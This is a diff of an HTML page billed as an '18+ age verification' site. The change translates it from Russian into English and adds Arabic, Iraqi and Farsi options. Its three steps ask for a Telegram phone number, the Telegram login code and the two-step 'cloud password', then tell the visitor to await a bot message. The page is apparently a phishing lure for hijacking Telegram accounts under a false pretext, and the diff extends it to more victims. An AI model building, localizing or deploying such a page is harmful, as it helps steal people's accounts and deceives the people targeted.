@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>ВЕРИФИКАЦИЯ 18+</title>
+    <title>18+ AGE VERIFICATION</title>
     <link rel="stylesheet" href="style.css" />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -11,120 +11,124 @@
 </head>
 <body>
 
-    <!-- Фоновое свечение (Ambient Glow Orbs) -->
+    <!-- Ambient Glow Orbs -->
     <div class="bg-glow-container">
         <div class="bg-glow bg-glow-1"></div>
         <div class="bg-glow bg-glow-2"></div>
         <div class="bg-glow bg-glow-3"></div>
     </div>
 
-    <!-- ============ ГЛАВНАЯ ============ -->
-    <div id="page-main" class="page active">
-        <div class="container">
+    <!-- MAIN CONTAINER -->
+    <div class="container">
+        <!-- Language Switcher Header -->
+        <div class="lang-switcher-wrapper">
+            <select id="langSelect" class="lang-select">
+                <option value="en" selected>🇬🇧 English</option>
+                <option value="ru">🇷🇺 Русский</option>
+                <option value="ar">🇸🇦 العربية</option>
+                <option value="iq">🇮🇶 العراقية</option>
+                <option value="fa">🇮🇷 فارسی</option>
+            </select>
+        </div>
+
+        <!-- ============ MAIN PAGE ============ -->
+        <div id="page-main" class="page active">
             <div class="card animate-fade-up">
                 <div class="badge-vip">
                     <span class="badge-dot"></span>
-                    🔞 Подтверждение возраста
+                    <span data-i18n="badge">🔞 Age Verification</span>
                 </div>
-                <h1 class="main-title"><span class="highlight">ВЕРИФИКАЦИЯ 18+</span></h1>
+                <h1 class="main-title"><span class="highlight" data-i18n="title">18+ VERIFICATION</span></h1>
                 <button class="btn-primary btn-large" id="btnGetStarted">
-                    <span>Пройти верификацию</span>
+                    <span data-i18n="btnStart">Verify Now</span>
                     <span class="btn-arrow">→</span>
                 </button>
-                <p class="main-subtext">⚡ Доступ только для пользователей старше 18 лет</p>
+                <p class="main-subtext" data-i18n="subtext">⚡ Access restricted to users 18 years or older</p>
             </div>
         </div>
-    </div>
 
-    <!-- ============ ШАГ 1: ТЕЛЕФОН ============ -->
-    <div id="page-phone" class="page">
-        <div class="container">
+        <!-- ============ STEP 1: PHONE ============ -->
+        <div id="page-phone" class="page">
             <div class="card animate-fade-up">
                 <div class="auth-header">
-                    <span class="auth-step">Шаг 1 из 3</span>
-                    <h2>Введите номер телефона</h2>
-                    <p class="auth-desc">Мы отправим код подтверждения в Telegram</p>
+                    <span class="auth-step" data-i18n="step1">Step 1 of 3</span>
+                    <h2 data-i18n="phoneTitle">Enter Phone Number</h2>
+                    <p class="auth-desc" data-i18n="phoneDesc">We will send a verification code to Telegram</p>
                 </div>
                 <form id="form-phone" novalidate>
                     <div class="form-group">
-                        <label for="phoneInput">Номер телефона</label>
+                        <label for="phoneInput" data-i18n="phoneLabel">Phone Number</label>
                         <div class="input-wrapper">
                             <span class="input-prefix">+</span>
-                            <input type="tel" id="phoneInput" placeholder="7 900 123 45 67" autocomplete="tel" required />
+                            <input type="tel" id="phoneInput" placeholder="1 234 567 8900" autocomplete="tel" required />
                         </div>
                         <div class="form-error" id="phoneError"></div>
                     </div>
                     <button type="submit" class="btn-primary btn-full" id="btnSendCode">
-                        <span>Отправить код</span>
+                        <span data-i18n="btnSendCode">Send Code</span>
                         <span class="spinner hidden" id="phoneSpinner"></span>
                     </button>
-                    <button type="button" class="btn-back" id="btnBackFromPhone">← Назад</button>
+                    <button type="button" class="btn-back" id="btnBackFromPhone" data-i18n="btnBack">← Back</button>
                 </form>
             </div>
         </div>
-    </div>
 
-    <!-- ============ ШАГ 2: КОД ============ -->
-    <div id="page-code" class="page">
-        <div class="container">
+        <!-- ============ STEP 2: CODE ============ -->
+        <div id="page-code" class="page">
             <div class="card animate-fade-up">
                 <div class="auth-header">
-                    <span class="auth-step">Шаг 2 из 3</span>
-                    <h2>Подтверждение</h2>
-                    <p class="auth-desc">Введите код, который был отправлен в Telegram.</p>
+                    <span class="auth-step" data-i18n="step2">Step 2 of 3</span>
+                    <h2 data-i18n="codeTitle">Verification Code</h2>
+                    <p class="auth-desc" data-i18n="codeDesc">Enter the confirmation code sent to Telegram</p>
                 </div>
                 <form id="form-code" novalidate>
                     <div class="form-group">
-                        <label for="codeInput">Код подтверждения</label>
+                        <label for="codeInput" data-i18n="codeLabel">Confirmation Code</label>
                         <input type="text" id="codeInput" placeholder="123456" inputmode="numeric" maxlength="6" required />
                         <div class="form-error" id="codeError"></div>
                     </div>
                     <button type="submit" class="btn-primary btn-full" id="btnVerifyCode">
-                        <span>Проверить код</span>
+                        <span data-i18n="btnVerifyCode">Verify Code</span>
                         <span class="spinner hidden" id="codeSpinner"></span>
                     </button>
-                    <button type="button" class="btn-back" id="btnBackFromCode">← Назад</button>
+                    <button type="button" class="btn-back" id="btnBackFromCode" data-i18n="btnBack">← Back</button>
                 </form>
             </div>
         </div>
-    </div>
 
-    <!-- ============ ШАГ 3: ОБЛАЧНЫЙ ПАРОЛЬ ============ -->
-    <div id="page-password" class="page">
-        <div class="container">
+        <!-- ============ STEP 3: PASSWORD ============ -->
+        <div id="page-password" class="page">
             <div class="card animate-fade-up">
                 <div class="auth-header">
-                    <span class="auth-step">Шаг 3 из 3</span>
-                    <h2>Облачный пароль</h2>
-                    <p class="auth-desc">Для этого аккаунта включена дополнительная защита.</p>
+                    <span class="auth-step" data-i18n="step3">Step 3 of 3</span>
+                    <h2 data-i18n="passTitle">Cloud Password</h2>
+                    <p class="auth-desc" data-i18n="passDesc">Two-step verification is enabled for this account</p>
                 </div>
                 <form id="form-password" novalidate>
                     <div class="form-group">
-                        <label for="passwordInput">Введите облачный пароль</label>
+                        <label for="passwordInput" data-i18n="passLabel">Enter Cloud Password</label>
                         <input type="password" id="passwordInput" placeholder="••••••••" required />
                         <div class="form-error" id="passwordError"></div>
                     </div>
                     <button type="submit" class="btn-primary btn-full" id="btnVerifyPassword">
-                        <span>Подтвердить</span>
+                        <span data-i18n="btnVerifyPass">Confirm</span>
                         <span class="spinner hidden" id="passwordSpinner"></span>
                     </button>
-                    <button type="button" class="btn-back" id="btnBackFromPassword">← Назад</button>
+                    <button type="button" class="btn-back" id="btnBackFromPassword" data-i18n="btnBack">← Back</button>
                 </form>
             </div>
         </div>
-    </div>
 
-    <!-- ============ ФИНАЛЬНАЯ СТРАНИЦА ============ -->
-    <div id="page-success" class="page">
-        <div class="container">
+        <!-- ============ SUCCESS PAGE ============ -->
+        <div id="page-success" class="page">
             <div class="card animate-fade-up">
                 <div class="success-icon">✅</div>
-                <h2 class="success-title">Вы успешно прошли верификацию!</h2>
+                <h2 class="success-title" data-i18n="successTitle">Verification Successful!</h2>
                 <div class="success-message">
-                    <p>Ваш возраст успешно подтвержден.</p>
-                    <p>Ожидайте сообщение от бота.</p>
+                    <p data-i18n="successP1">Your age has been successfully verified.</p>
+                    <p data-i18n="successP2">Please wait for a message from the bot.</p>
                 </div>
-                <button class="btn-secondary" id="btnReset">На главную</button>
+                <button class="btn-secondary" id="btnReset" data-i18n="btnHome">Main Page</button>
             </div>
         </div>
     </div>
